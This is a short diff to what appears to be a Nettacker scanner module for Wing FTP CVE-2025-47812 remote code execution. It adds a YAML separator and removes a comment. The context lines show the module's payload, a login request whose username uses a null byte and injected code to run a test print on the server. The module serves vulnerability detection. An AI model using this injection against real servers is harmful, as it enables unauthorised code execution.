@@ -1,3 +1,4 @@
+---
 info:
   name: wing_ftp_cve_2025_47812_rce
   author: Aryan Kumar
@@ -19,7 +20,6 @@ payloads:
           Content-Type: "application/x-www-form-urlencoded"
         data: "username=anonymous%00]]%0dprint('NETTACKER_RCE_TEST')%0d--&password=anything"
         url: "{target}/loginok.html"
-        # ADDED THIS TO PREVENT ENGINE CRASH
         response:
           condition_type: and
           conditions:
